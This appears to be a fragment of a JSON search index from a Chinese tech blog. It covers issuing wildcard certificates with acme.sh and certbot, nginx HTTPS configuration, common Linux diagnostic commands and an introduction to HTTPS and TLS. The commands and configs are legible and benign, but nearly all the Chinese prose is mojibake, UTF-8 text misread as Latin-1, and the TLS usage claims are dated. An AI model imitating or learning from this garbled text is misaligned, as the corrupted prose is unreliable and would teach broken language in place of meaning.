```\n\n+ ç”Ÿæˆæ³›åŸŸåè¯ä¹¦\n\n  ```bash\n  acme.sh --issue -d \"*.liuvv.com\" --dns dns_ali\n  ```\n  åœ¨`~/.acme`æ–‡ä»¶é‡Œç”Ÿæˆäº†`*.liuvv.com` æ–‡ä»¶å¤¹\n\n+ é…ç½®nginx\n\n  ```nginx\n  server {\n          listen 80 default_server;\n          listen [::]:80 default_server;\n          rewrite ^ https://$http_host$request_uri? permanent; #httpsè·³è½¬åˆ°https,æ°¸ä¹…é‡å®šå‘\n  }\n  \n  server {\n          listen 443 ssl default_server;\n          listen [::]:443 ssl default_server;\n  \n          ssl_certificate \"/etc/nginx/ssl/fullchain.cer\";\n          ssl_certificate_key \"/etc/nginx/ssl/*.liuvv.com.key\";\n  \n          root /home/levonfly/www;\n          index index.html;\n  }\n  ```\n\n  \n\n+ å®‰è£…è¯ä¹¦\n\n  ```bash\n  sudo ./acme.sh  --installcert  -d  *.liuvv.com   \\\n          --key-file   /etc/nginx/ssl/*.liuvv.com.key \\\n          --fullchain-file /etc/nginx/ssl/fullchain.cer \\\n          --reloadcmd  \"service nginx force-reload\"\n  ```\n\n  + è¿™é‡Œç”¨çš„æ˜¯ `service nginx force-reload`, ä¸æ˜¯ `service nginx reload`, æ®æµ‹è¯•, `reload` å¹¶ä¸ä¼šé‡æ–°åŠ è½½è¯ä¹¦, æ‰€ä»¥ç”¨çš„ `force-reload`\n  + nginx çš„é…ç½® `ssl_certificate` ä½¿ç”¨ `/etc/nginx/ssl/fullchain.cer` ï¼Œè€Œé `/etc/nginx/ssl/<domain>.cer` ï¼Œå¦åˆ™ [SSL Labs](https://www.ssllabs.com/ssltest/) çš„æµ‹è¯•ä¼šæŠ¥ `Chain issues Incomplete` é”™è¯¯ã€‚\n\n+ é‡æ–°ç”Ÿæˆè¯ä¹¦\n\n  ```bash\n  sudo ./acme.sh --renew -d *.liuvv.com --force\n  ```\n\n  é€šè¿‡è¿™ä¸ªå‘½ä»¤,è§‚çœ‹æ˜¯å¦è‡ªåŠ¨éƒ¨ç½², å¹¶è§‚å¯Ÿè¯ä¹¦çš„åˆ°æœŸæ—¶é—´.\n\n\n\n### 4. å‚è€ƒèµ„æ–™\n\n+ [https://github.com/Neilpang/acme.sh/wiki/%E8%AF%B4%E6%98%8E](https://github.com/Neilpang/acme.sh/wiki/è¯´æ˜)\n\n+ https://www.mustu.cn/acme-shhuo-qu-lets-encrypt-wildcardtong-pei-ssl/\n\n+ https://www.jianshu.com/p/a9f2088e099c\n\n+ https://deepzz.com/post/acmesh-letsencrypt-cert-auto-renew.html","tags":["acme.sh"],"categories":["https"]},{"title":"linuxå¸¸ç”¨å‘½ä»¤æ€»ç»“","url":"%2Fp%2F1d063ae7.html","content":"\n\n\n# 1. æŸ¥çœ‹linuxç³»ç»Ÿä¿¡æ¯\n\n### 1.1 æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬\n\n```bash\n#lsb_release -a \nNo LSB modules are available.\nDistributor ID: Ubuntu\nDescription:    Ubuntu 16.04.6 LTS\nRelease:        16.04\nCodename:       xenial\n\n#uname -srm  \nLinux 4.15.0-1060-gcp x86_64\n\n#cat /etc/os-release\nNAME=\"Ubuntu\"\nVERSION=\"16.04.6 LTS (Xenial Xerus)\"\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME=\"Ubuntu 16.04.6 LTS\"\nVERSION_ID=\"16.04\"\nHOME_URL=\"http://www.ubuntu.com/\"\nSUPPORT_URL=\"http://help.ubuntu.com/\"\nBUG_REPORT_URL=\"http://bugs.launchpad.net/ubuntu/\"\nVERSION_CODENAME=xenial\nUBUNTU_CODENAME=xenial\n\n#cat /proc/version\nLinux version 4.15.0-1060-gcp (buildd@lcy01-amd64-028) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12)) #64-Ubuntu SMP Thu Mar 26 03:21:15 UTC 2020\n\n#cat /etc/issue\nUbuntu 16.04.6 LTS \\n \\l\n```\n\n<!-- more -->\n\n### 1.2 æŸ¥çœ‹ç¡¬ç›˜å†…å­˜ CPU\n\n##### 1.2.1 æŸ¥çœ‹ç¡¬ç›˜\n\n```bash\n# df -h  æŸ¥çœ‹ç£ç›˜ç©ºé—´\nFilesystem      Size  Used Avail Use% Mounted on\nudev            986M     0  986M   0% /dev\ntmpfs           200M   22M  179M  11% /run\n/dev/sda1        29G  5.6G   24G  20% /\n\n\n#fdisk -l  æŸ¥çœ‹Linuxä¸­çš„æ‰€æœ‰ç£ç›˜åˆ†åŒº\nDisk /dev/sda: 30 GiB, 32212254720 bytes, 62914560 sectors\nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 4096 bytes\nI/O size (minimum/optimal): 4096 bytes / 4096 bytes\nDisklabel type: gpt\nDisk identifier: A03F431A-7AE6-406D-B233-EED234598EEE\n\nDevice      Start      End  Sectors  Size Type\n/dev/sda1  227328 62914526 62687199 29.9G Linux filesystem\n/dev/sda14   2048    10239     8192    4M BIOS boot\n/dev/sda15  10240   227327   217088  106M EFI System\n```\n\n##### 1.2.1 æŸ¥çœ‹å†…å­˜\n\n```bash\n# free -h æŸ¥çœ‹å†…å­˜\n              total        used        free      shared  buff/cache   available\nMem:           1.9G        769M        211M         21M        1.0G        1.0G\nSwap:            0B          0B          0B\n```\n\n##### 1.2.2 æŸ¥çœ‹ CPU\n\n```bash\n# lscpu\nArchitecture:          x86_64\nCPU op-mode(s):        32-bit, 64-bit\nByte Order:            Little Endian\nCPU(s):                2\n\n# cat /proc/cpuinfo   æŸ¥çœ‹ CPU ä¿¡æ¯\nprocessor       : 0\nvendor_id       : GenuineIntel\ncpu family      : 6\nmodel           : 63\nmodel name      : Intel(R) Xeon(R) CPU @ 2.30GHz\nstepping        : 0\nmicrocode       : 0x1\ncpu MHz         : 2300.000\ncache size      : 46080 KB\n\n# cat /proc/cpuinfo| grep \"processor\"| wc -l   æŸ¥çœ‹ CPU ä¸ªæ•°\n2\n```\n\n\n\n# 2. è¿›ç¨‹ç«¯å£ç›¸å…³\n\n### 2.1 æŸ¥è¯¢è¿›ç¨‹\n\n```bash\nps     # displays processes for the current shell.\nps -ef # Display every active process on a Linux system in generic (Unix/Linux) format.\nps -aux # Display all processes in BSD format.\n```\n\n\n\n### 2.2 æŸ¥è¯¢ç«¯å£\n\n```bash\n#1. è¿™ç±»å‘½ä»¤ä¸€å®šè¦ç”¨sudo\n#2. a: all p: procee, t:tcp, u:udp, l:æ­£åœ¨ç›‘å¬çš„ , n: ç¦æ­¢åŸŸåè§£æ, åªæ˜¾ç¤ºæ•°å­—ip\nsudo netstat -anp | grep 80\nsudo netstat -tunlp | grep 80\n\n\n# çŸ¥é“è¿›ç¨‹åå­—åæŸ¥ç«¯å£\nps -ef | grep processName  #å¾—åˆ°processID\nnetstat -anp | grep processID #pèƒ½æ˜¾ç¤ºå‡ºè¿›ç¨‹åå’Œè¿›ç¨‹id, è¿‡æ»¤å¾—åˆ°ç«¯å£\n\n# çŸ¥é“ç«¯å£åæŸ¥è¿›ç¨‹åå­—\nsudo lsof -i :80\n\n# ä¸€ä¸ªå‘½ä»¤æå®š\nsudo netstat -anp | grep processID\nsudo netstat -anp | grep processName\n```\n\n\n\n### 2.3 è¿›ç¨‹ç®¡ç†å™¨\n\n```bash\n# top\ntop - 13:41:19 up 83 days,  2:53,  1 user,  load average: 0.21, 0.85, 0.72\nTasks: 148 total,   1 running, 106 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  7.0 us,  4.1 sy,  0.0 ni, 88.4 id,  0.2 wa,  0.0 hi,  0.3 si,  0.0 st\nKiB Mem :  2040116 total,   212880 free,   789056 used,  1038180 buff/cache\nKiB Swap:        0 total,        0 free,        0 used.  1040512 avail Mem\n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND\n30844 root      20   0  572436 296072  16972 S   4.7 14.5   4235:28 kube-apiserver\n31035 root      20   0  643968  55980  20080 S   4.3  2.7   3362:32 kubelet\n30735 root      20   0 10.121g  67348  10588 S   2.3  3.3   1994:44 etcd\n```\n\n+ ç¬¬ä¸€è¡Œçš„å‚æ•°\n\n  **10:59:22**  : å½“å‰ç³»ç»Ÿæ—¶é—´\n   **up 37 days, 20:48**  : ç³»ç»Ÿç´¯ç§¯ä»¥åŠè¿è¡Œçš„æ—¶é—´\n   **3 users** : å½“å‰ç”¨æˆ·æ•°é‡\n   **load average: 0.00,0.00,0.00** : ç³»ç»Ÿè´Ÿè½½çš„ä¸‰ä¸ªæ•°å€¼åˆ†åˆ«è¡¨ç¤ºçš„æ˜¯1åˆ†é’Ÿï¼Œ5åˆ†é’Ÿå’Œ15åˆ†é’Ÿç³»ç»Ÿè´Ÿè½½çš„å¹³å‡å€¼\n\n  å½“CPUå®Œå…¨ç©ºé—²çš„æ—¶å€™ï¼Œå¹³å‡è´Ÿè·ä¸º0ï¼›å½“CPUå·¥ä½œé‡é¥±å’Œçš„æ—¶å€™ï¼Œå¹³å‡è´Ÿè·ä¸º1ã€‚nä¸ªCPUçš„ç”µè„‘ï¼Œå¯æ¥å—çš„ç³»ç»Ÿè´Ÿè·æœ€å¤§ä¸ºn.0ã€‚\n\n+ ç¬¬äºŒè¡Œçš„å‚æ•°\n\n   **Tasksï¼š 112 total** : è¿›ç¨‹æ€»æ•°\n   **1 running** : æ­£å¸¸è¿è¡Œçš„è¿›ç¨‹æ•°é‡\n   **121 sleeping** : ä¼‘çœ çš„è¿›ç¨‹æ•°é‡\n   **0 stopped** : åœæ­¢çš„è¿›ç¨‹æ•°é‡\n   **0 zombie** : åƒµæ­»è¿›ç¨‹æ•°é‡\n\n+ ç¬¬ä¸‰è¡Œçš„å‚æ•°\n\n  **0.2 us** : ç”¨æˆ·è¿›ç¨‹å ç”¨cpuèµ„æºçš„ç™¾åˆ†æ¯”\n   **0.2 sy** : å†…æ ¸è¿›ç¨‹å ç”¨cpuèµ„æºçš„ç™¾åˆ†æ¯”\n   **0.0 ni** : ç”¨æˆ·è¿›ç¨‹ç©ºé—´å†…æ”¹å˜è¿‡ä¼˜å…ˆçº§çš„è¿›ç¨‹å cpuèµ„æºçš„ç™¾åˆ†æ¯”\n   **99.7 id** : ç©ºé—²cpuç™¾åˆ†æ¯”\n   **0.0 wa** : ç­‰å¾…ioçš„è¿›ç¨‹å cpuèµ„æºçš„ç™¾åˆ†æ¯”\n   **0.0 hi** : ç¡¬ä¸­æ–­å ç”¨cpuçš„ç™¾åˆ†æ¯”\n   **0.0 si**: è½¯ä¸­æ–­å ç”¨çš„ç™¾åˆ†æ¯”\n   **0.0 st** : è™šæ‹Ÿæœºå ç”¨ç™¾åˆ†æ¯”\n\n+ ç¬¬å››è¡Œçš„æ„ä¹‰\n\n  **524280k total** : äº¤æ¢åŒºå†…å­˜æ€»å®¹é‡\n  **0k used** : äº¤æ¢åŒºå†…å­˜ä½¿ç”¨çš„å®¹é‡\n  **524280k used**: äº¤æ¢åŒºç©ºé—²çš„å†…å­˜å®¹é‡\n  **848380k cached** : ç¼“å­˜çš„äº¤æ¢åŒºæ€»é‡\n\n+ è¿›ç¨‹çš„æ„ä¹‰\n   **PID** : è¿›ç¨‹idï¼Œæ ‡è®°å”¯ä¸€è¿›ç¨‹\n   **USER** : è¿›ç¨‹ç”¨æˆ·å\n   **PR** : ä¼˜å…ˆçº§\n   **NI** : niceå€¼ã€‚è´Ÿå€¼è¡¨ç¤ºé«˜ä¼˜å…ˆçº§ï¼Œæ­£å€¼è¡¨ç¤ºä½ä¼˜å…ˆçº§\n   **VIRT** : è¿›ç¨‹ä½¿ç”¨çš„è™šæ‹Ÿå†…å­˜çš„å¤§å°\n   **RES** : æŒ‡è¿›ç¨‹é™¤å»ä½¿ç”¨äº¤æ¢åŒºswapçš„å†…å­˜ï¼Œä½¿ç”¨çš„ç‰©ç†å†…å­˜çš„å¤§å°\n   **SHR** : è¿›ç¨‹å…±äº«å†…å­˜çš„å¤§å°\n   **S** : process status è¿›ç¨‹çŠ¶æ€ ã€‚ åˆ†åˆ«æœ‰D R S T Z ,åˆ†åˆ«è¡¨ç¤ºä¸å¯ä¸­æ–­çš„ä¼‘çœ ã€æ­£åœ¨è¿è¡Œã€ä¼‘çœ ä¸­ã€æš‚åœæˆ–è€…è·Ÿè¸ªçŠ¶æ€ã€åƒµæ­»çŠ¶æ€\n   **%CPU** : cpuçš„ä½¿ç”¨é‡å æ€»cpuæ—¶é—´çš„ç™¾åˆ†æ¯”\n   **%MEM** : è¿›ç¨‹ä½¿ç”¨çš„ç‰©ç†å†…å­˜ç™¾åˆ†æ¯”\n   **TIME+** : è¿›ç¨‹ä½¿ç”¨çš„CPUæ—¶é—´æ€»è®¡ï¼Œç²¾ç¡®åˆ°1/100ç§’\n   **COMMAND** : å‘½ä»¤æˆ–è€…è¿›ç¨‹åç§°\n\n\n\n# 3. ç³»ç»Ÿè®¾ç½®\n\n### 3.1 è®¾ç½®linuxæ—¶é—´å’Œæ—¶åŒº\n\n```bash\n# è®¾ç½®æ—¶é—´\ndate -s \"2015-10-25 15:00:00\"\n\n#è®¾ç½®æ—¶åŒº\ntzselect  #å‘½ä»¤åªå‘Šè¯‰ä½ é€‰æ‹©çš„æ—¶åŒºçš„å†™æ³•ï¼Œå¹¶ä¸ä¼šç”Ÿæ•ˆã€‚\nåœ¨.bashrcæ·»åŠ   export TZ='Asia/Shanghai'\n```\n\n\n\n# 4. è¾…åŠ©å‘½ä»¤\n\n### \n\n\n\n\n\n# 5. å…¶ä»–\n\n### 5.1 åŸŸåæŸ¥è¯¢\n\n```bash\nhost hostname [server]\n[server]ï¼šä½¿ç”¨ä¸æ˜¯ç”±/etc/resolv.confæ–‡ä»¶å®šä¹‰çš„DNSæœåŠ¡å™¨IPæ¥æŸ¥è¯¢æŸå°ä¸»æœºçš„IPã€‚\n\nhost www.baidu.com\nhost www.baidu.com 8.8.8.8\n\nhost google.com #Find the Domain IP Address\nhost -t ns google.com #Find Domain Name Servers, dns\nhost -t cname mail.google.com #Find Domain CNAME Record\nhost -t mx google.com #Find Domain MX Record\nhost -t txt google.com#Find Domain TXT Record\nhost -a google.com #Find All Information of Domain Records and Zones\n```\n\n\n\n\n\n# 5. å‚è€ƒæ•™ç¨‹\n\n+ https://linuxtools-rst.readthedocs.io/zh_CN/latest/","tags":["linux"],"categories":["å‘½ä»¤"]},{"title":"httpsåè®®ç®€ä»‹,ç½‘ç«™æ”¯æŒhttps, golangå¯åŠ¨https","url":"%2Fp%2Ffcd8becb.html","content":"\n\n### 1. https åè®®ç®€ä»‹\n\nHTTPS åè®®ï¼ˆHyperText Transfer Protocol over Secure Socket Layerï¼‰ï¼šå¯ä»¥ç†è§£ä¸ºHTTP+SSL/TLSï¼Œ å³ HTTP ä¸‹åŠ å…¥ SSL å±‚ï¼ŒHTTPS çš„å®‰å…¨åŸºç¡€æ˜¯ SSLï¼Œå› æ­¤åŠ å¯†çš„è¯¦ç»†å†…å®¹å°±éœ€è¦ SSLï¼Œç”¨äºå®‰å…¨çš„ HTTP æ•°æ®ä¼ è¾“ã€‚\n\n> SSLå†å²å’Œç‰ˆæœ¬\n\n1994å¹´ï¼ŒNetScapeå…¬å¸è®¾è®¡äº†SSLåè®®ï¼ˆSecure Sockets Layerï¼‰çš„1.0ç‰ˆï¼Œä½†æ˜¯æœªå‘å¸ƒã€‚\n\n1995å¹´ï¼ŒNetScapeå…¬å¸å‘å¸ƒSSL 2.0ç‰ˆï¼Œå¾ˆå¿«å‘ç°æœ‰ä¸¥é‡æ¼æ´ã€‚\n\n1996å¹´ï¼ŒSSL 3.0ç‰ˆé—®ä¸–ï¼Œå¾—åˆ°å¤§è§„æ¨¡åº”ç”¨ã€‚\n\n1999å¹´ï¼Œäº’è”ç½‘æ ‡å‡†åŒ–ç»„ç»‡ISOCæ¥æ›¿NetScapeå…¬å¸ï¼Œå‘å¸ƒäº†SSLçš„å‡çº§ç‰ˆTLS 1.0ç‰ˆã€‚\n\n2006å¹´å’Œ2008å¹´ï¼ŒTLSè¿›è¡Œäº†ä¸¤æ¬¡å‡çº§ï¼Œåˆ†åˆ«ä¸ºTLS 1.1ç‰ˆå’ŒTLS 1.2ç‰ˆã€‚æœ€æ–°çš„å˜åŠ¨æ˜¯2011å¹´TLS 1.2çš„ä¿®è®¢ç‰ˆã€‚\n\n\nç›®å‰ï¼Œåº”ç”¨æœ€å¹¿æ³›çš„æ˜¯TLS 1.0ï¼Œæ¥ä¸‹æ¥æ˜¯SSL 3.0ã€‚ä½†æ˜¯ï¼Œä¸»æµæµè§ˆå™¨éƒ½å·²ç»å®ç°äº†TLS 1.2çš„æ”¯æŒã€‚\n\n---\nTLS 1.0é€šå¸¸è¢«æ ‡ç¤ºä¸ºSSL 3.1\n\nTLS 1.1ä¸ºSSL 3.2ï¼Œ\n\nTLS 1.2ä¸ºSSL 3.3ã€‚\n\n<!-- more -->\n\n\n### 2. https éå¯¹ç§°åŠ å¯†å’Œæ•°å­—è¯ä¹¦\n\n+ HTTPSçš„æ•°æ®ä¼ è¾“æ˜¯åŠ å¯†çš„ã€‚å®é™…ä½¿ç”¨ä¸­ï¼ŒHTTPSåˆ©ç”¨çš„æ˜¯å¯¹ç§°ä¸éå¯¹ç§°åŠ å¯†ç®—æ³•ç»“åˆçš„æ–¹å¼ã€‚\n\n+ å¯¹ç§°åŠ å¯†ï¼Œå°±æ˜¯é€šä¿¡åŒæ–¹ä½¿ç”¨ä¸€ä¸ªå¯†é’¥ï¼Œè¯¥å¯†é’¥æ—¢ç”¨äºæ•°æ®åŠ å¯†ï¼ˆå‘é€æ–¹ï¼‰ï¼Œä¹Ÿç”¨äºæ•°æ®è§£å¯†ï¼ˆæ¥æ”¶æ–¹ï¼‰ã€‚\n\n+ éå¯¹ç§°åŠ å¯†ï¼Œä½¿ç”¨ä¸¤ä¸ªå¯†é’¥ã€‚å‘é€æ–¹ä½¿ç”¨å…¬é’¥ï¼ˆå…¬å¼€å¯†é’¥ï¼‰å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œæ•°æ®æ¥æ”¶æ–¹ä½¿ç”¨ç§é’¥å¯¹æ•°æ®è¿›è¡Œè§£å¯†ã€‚\n\n+ å®é™…æ“ä½œä¸­ï¼Œå•çº¯ä½¿ç”¨å¯¹ç§°åŠ å¯†æˆ–å•çº¯ä½¿ç”¨éå¯¹ç§°åŠ å¯†éƒ½ä¼šå­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œæ¯”å¦‚å¯¹ç§°åŠ å¯†çš„å¯†é’¥ç®¡ç†å¤æ‚ï¼›éå¯¹ç§°åŠ å¯†çš„å¤„ç†æ€§èƒ½ä½ã€èµ„æºå ç”¨é«˜ç­‰ï¼Œå›  æ­¤HTTPSç»“åˆäº†è¿™ä¸¤ç§æ–¹å¼ã€‚\n\n+ HTTPSæœåŠ¡ç«¯åœ¨è¿æ¥å»ºç«‹è¿‡ç¨‹ï¼ˆssl shakingæ¡æ‰‹åè®®ï¼‰ä¸­ï¼Œä¼šå°†è‡ªèº«çš„å…¬é’¥å‘é€ç»™å®¢æˆ·ç«¯ã€‚å®¢æˆ·ç«¯æ‹¿åˆ°å…¬é’¥åï¼Œä¸æœåŠ¡ç«¯åå•†æ•°æ®ä¼ è¾“é€šé“çš„å¯¹ç§°åŠ å¯†å¯†é’¥-å¯¹è¯å¯†é’¥ï¼Œéšåçš„è¿™ä¸ªåå•†è¿‡ç¨‹åˆ™ æ˜¯åŸºäºéå¯¹ç§°åŠ å¯†çš„ï¼ˆå› ä¸ºè¿™æ—¶å®¢æˆ·ç«¯å·²ç»æ‹¿åˆ°äº†å…¬é’¥ï¼Œè€ŒæœåŠ¡ç«¯æœ‰ç§é’¥ï¼‰ã€‚\n\n+ ä¸€æ—¦åŒæ–¹åå•†å‡ºå¯¹è¯å¯†é’¥ï¼Œåˆ™åç»­çš„æ•°æ®é€šè®¯å°±ä¼šä¸€ç›´ä½¿ç”¨åŸºäºè¯¥å¯¹è¯å¯†é’¥çš„å¯¹ç§°åŠ å¯†ç®—æ³•äº†ã€‚(å¯¹ç§°åŠ å¯†ä¼šåŠ å¿«é€Ÿåº¦)\n\n\n\nä¸Šè¿°è¿‡ç¨‹æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯åŒæ–¹æ¡æ‰‹è¿‡ç¨‹ä¸­ï¼Œå¦‚ä½•ä¿éšœHTTPSæœåŠ¡ç«¯å‘é€ç»™å®¢æˆ·ç«¯çš„å…¬é’¥ä¿¡æ¯æ²¡æœ‰è¢«ç¯¡æ”¹å‘¢ï¼Ÿå®é™…åº”ç”¨ä¸­ï¼ŒHTTPSå¹¶éç›´æ¥ä¼ è¾“å…¬é’¥ä¿¡æ¯ï¼Œè€Œæ˜¯ä½¿ç”¨æºå¸¦å…¬é’¥ä¿¡æ¯çš„æ•°å­—è¯ä¹¦æ¥ä¿è¯å…¬é’¥çš„å®‰å…¨æ€§å’Œå®Œæ•´æ€§ã€‚\n\næ•°å­—è¯ä¹¦ï¼Œåˆç§°äº’è”ç½‘ä¸Šçš„\"èº«ä»½è¯\"ï¼Œç”¨äºå”¯ä¸€æ ‡è¯†ä¸€ä¸ªç»„ç»‡æˆ–ä¸€ä¸ªæœåŠ¡å™¨çš„ï¼Œè¿™å°±å¥½æ¯”æˆ‘ä»¬æ—¥å¸¸ç”Ÿæ´»ä¸­ä½¿ç”¨çš„\"å±…æ°‘èº«ä»½è¯\"ï¼Œç”¨äºå”¯ä¸€æ ‡è¯†ä¸€ä¸ªäººã€‚\n\næœåŠ¡ç«¯å°†æ•°å­—è¯ä¹¦ä¼ è¾“ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å¦‚ä½•æ ¡éªŒè¿™ä¸ªè¯ä¹¦çš„çœŸä¼ªå‘¢ï¼Ÿæˆ‘ä»¬çŸ¥é“å±…æ°‘èº«ä»½è¯æ˜¯ç”±å›½å®¶ç»Ÿä¸€åˆ¶ä½œå’Œé¢å‘çš„ï¼Œä¸ªäººå‘æˆ·å£æ‰€åœ¨åœ°å…¬å®‰æœºå…³ç”³è¯·ï¼Œå›½å®¶é¢å‘çš„èº«ä»½è¯æ‰å…·æœ‰æ³•å¾‹æ•ˆåŠ›ï¼Œä»»ä½•åœ°æ–¹è¿™ä¸ªèº«ä»½è¯éƒ½æ˜¯æœ‰æ•ˆå’Œå¯è¢«æ¥çº³çš„ã€‚\n\nç½‘ç«™çš„è¯ä¹¦ä¹Ÿæ˜¯åŒæ ·çš„é“ç†ã€‚ä¸€èˆ¬æ¥è¯´æ•°å­—è¯ä¹¦ä»å—ä¿¡çš„æƒå¨è¯ä¹¦æˆæƒæœºæ„ (Certification Authorityï¼Œè¯ä¹¦æˆæƒæœºæ„)ä¹°æ¥çš„ï¼ˆå…è´¹çš„å¾ˆå°‘ï¼‰ã€‚ä¸€èˆ¬æµè§ˆå™¨åœ¨å‡ºå‚æ—¶å°±å†…ç½®äº†è¯¸å¤šçŸ¥åCAï¼ˆå¦‚Verisignã€GoDaddyã€ç¾å›½å›½é˜²éƒ¨ã€ CNNICç­‰ï¼‰çš„æ•°å­—è¯ä¹¦æ ¡éªŒæ–¹æ³•ï¼Œåªè¦æ˜¯è¿™äº›CAæœºæ„é¢å‘çš„è¯ä¹¦ï¼Œæµè§ˆå™¨éƒ½èƒ½æ ¡éªŒã€‚\n\nå¯¹äºCAæœªçŸ¥çš„è¯ä¹¦ï¼Œæµè§ˆå™¨åˆ™ä¼šæŠ¥é”™ã€‚ä¸»æµæµè§ˆå™¨éƒ½æœ‰è¯ä¹¦ç®¡ç†åŠŸèƒ½ï¼Œä½†é‰´äºè¿™äº›åŠŸèƒ½æ¯”è¾ƒé«˜çº§ï¼Œä¸€èˆ¬ç”¨æˆ·æ˜¯ä¸ç”¨å»å…³å¿ƒçš„ã€‚\n\n\n\n\n### 3. è®©è‡ªå·±çš„ç½‘ç«™æ”¯æŒ https\n\n+ ä½¿ç”¨ Letâ€™s Encrypt æä¾›çš„å…è´¹è¯ä¹¦, æ”¾åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸­, å¹¶ä¸”åœ¨nginxé…ç½®å¥½è¯ä¹¦è·¯å¾„, è¿™æ ·ä½¿ç”¨æµè§ˆå™¨è®¿é—®çš„æ—¶å€™å°±ä¼šè§åˆ°ç†Ÿæ‚‰çš„ç»¿è‰²å°é”å¤´äº†. éœ€è¦æ³¨æ„è¯ä¹¦å¿…é¡»é¢å‘ç»™`æŸä¸ªåŸŸå`, æ‰€ä»¥`ipåœ°å€`æ— æ•ˆ.\n\n+ å®‰è£…å·¥å…·certbot\n\n```\ngit clone https://github.com/certbot/certbot\ncd certbot\nchmod +x certbot-auto\n\t\n# certbot-auto å³ä¸ºè‡ªåŠ¨åŒ–è„šæœ¬å·¥å…·, ä»–ä¼šåˆ¤æ–­ä½ çš„æœåŠ¡æ˜¯nginxè¿˜æ˜¯apache, ç„¶åæ‰§è¡Œå¯¹åº”é€»è¾‘\n./certbot-auto --help\n```\n\n+ ç”Ÿæˆè¯ä¹¦\n\n```bash\n# webrootä»£è¡¨webrootæ ¹ç›®å½•æ¨¡å¼, certonlyä»£è¡¨åªç”Ÿæˆè¯ä¹¦ é‚®ç®±äº²æµ‹æ²¡å•¥å¤§ç”¨, åŸŸåä¸€å®šè¦å’Œè‡ªå·±è¦ç”³è¯·è¯ä¹¦çš„åŸŸåä¸€è‡´\n./certbot-auto certonly --webroot --agree-tos -v -t --email ä½ çš„é‚®ç®± -w æœåŠ¡å™¨æ ¹ç›®å½• -d ä½ è¦ç”³è¯·çš„åŸŸå\n\t\n\t\n# å®é™…å¦‚ä¸‹\n./certbot-auto certonly --webroot --agree-tos -v -t --email levonfly@gmail.com -w /var/www/html/ -d a.xuanyueting.com\n```\n\nç„¶åä¼šåœ¨/etc/letsencrypt/ç›®å½•ä¸‹ç”Ÿæˆç›¸å…³æ–‡ä»¶, ä½ æ‰€éœ€è¦çš„è¯ä¹¦å…¶å®åœ¨`/etc/letsencrypt/live/a.xuanyueting.com/`ç›®å½•ä¸­.\n\n`fullchain.pem`å¯ä»¥çœ‹ä½œæ˜¯è¯ä¹¦å…¬é’¥, `privkey.pem`æ˜¯è¯ä¹¦ç§é’¥, æ˜¯æˆ‘ä»¬ä¸‹é¢éœ€è¦ä½¿ç”¨åˆ°çš„ä¸¤ä¸ªæ–‡ä»¶\n\n\n+ nginx é…ç½®æ”¯æŒ https\n\n```nginx\nserver {\n    listen 80 default_server;\n    listen [::]:80 default_server;\n    rewrite ^ https://$http_host$request_uri? permanent;\n}\n\n\nserver {\n\t  listen 443 ssl default_server;\n    listen [::]:443 ssl default_server;\n    ssl_certificate \"/etc/letsencrypt/live/a.xuanyueting.com/fullchain.pem\";\n    ssl_certificate_key \"/etc/letsencrypt/live/a.xuanyueting.com/privkey.pem\";\n    \n    root /var/www/html;\n    ....\n}\n```\n\n+ é‡å¯ nginx éªŒè¯\n\t\n```bash\nsudo service nginx restart\n```\nè®¿é—® a.xuanyueting.com, ä¼šå‘ç°å‡ºç°äº†å°ç»¿é”\n\n\n\n### 4. freesnç½‘ç«™å…è´¹ç”³è¯·\n\n+ https://freessl.cn/ æ³¨å†Œè´¦å·\n\n+ é€‰æ‹©Let's Encrypt V2 æ”¯æŒé€šé…ç¬¦\n\n  ![1](httpsåè®®_ç½‘ç«™æ”¯æŒhttps_é€šè¿‡golangå¯åŠ¨https/1.png)\n\n+ å¯åŠ¨keymanager(éœ€è¦ä¸‹è½½), è®¾ç½®ä¸€ä¸ªå¯†ç \n\n+ æµè§ˆå™¨æ‹‰èµ·keymanager, ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªcsr\n\n+ DNS éªŒè¯\n\n  ![1](httpsåè®®_ç½‘ç«™æ”¯æŒhttps_é€šè¿‡golangå¯åŠ¨https/2.png)\n\n  CA å°†é€šè¿‡æŸ¥è¯¢ DNS çš„ TXT è®°å½•æ¥ç¡®å®šæ‚¨å¯¹è¯¥åŸŸåçš„æ‰€æœ‰æƒã€‚æ‚¨åªéœ€è¦åœ¨åŸŸåç®¡ç†å¹³å°å°†ç”Ÿæˆçš„ TXT è®°å½•åä¸è®°å½•å€¼æ·»åŠ åˆ°è¯¥åŸŸåä¸‹ï¼Œç­‰å¾…å¤§çº¦ 1 åˆ†é’Ÿå³å¯éªŒè¯æˆåŠŸã€‚\n\n  \n\n  éœ€è¦ä½ åˆ°ä½ çš„åŸŸåæ‰˜ç®¡æœåŠ¡å•†é‚£é‡Œæ·»åŠ ä¸€æ¡ TXT è®°å½•ï¼Œå…¶ä¸­è®°å½•åç§°ä¸ºç¬¬äºŒè¡Œçš„å†…å®¹,è®°å½•å€¼ä¸ºç¬¬ä¸‰è¡Œçš„å†…å®¹ã€‚\n\n  ![1](httpsåè®®_ç½‘ç«™æ”¯æŒhttps_é€šè¿‡golangå¯åŠ¨https/3.png)\n\n+ ç”Ÿæˆè¯ä¹¦å¹¶ä¸”ä¸‹è½½, å»ºè®®ä¿å­˜åˆ°key manageré‡Œ\n\t![1](httpsåè®®_ç½‘ç«™æ”¯æŒhttps_é€šè¿‡golangå¯åŠ¨https/4.png)\n\n+ ä¿å­˜åˆ°key manageré‡Œ, æœ‰æ•ˆæœŸ3ä¸ªæœˆ, é€‰æ‹©å¯¼å‡ºè¯ä¹¦, nginx, 2ä¸ªæ–‡ä»¶crt å’Œ key\n  ![1](httpsåè®®_ç½‘ç«™æ”¯æŒhttps_é€šè¿‡golangå¯åŠ¨https/5.png)\n  \n+ Nginx é…ç½®\n\n  ```nginx\n  server {\n          listen 80 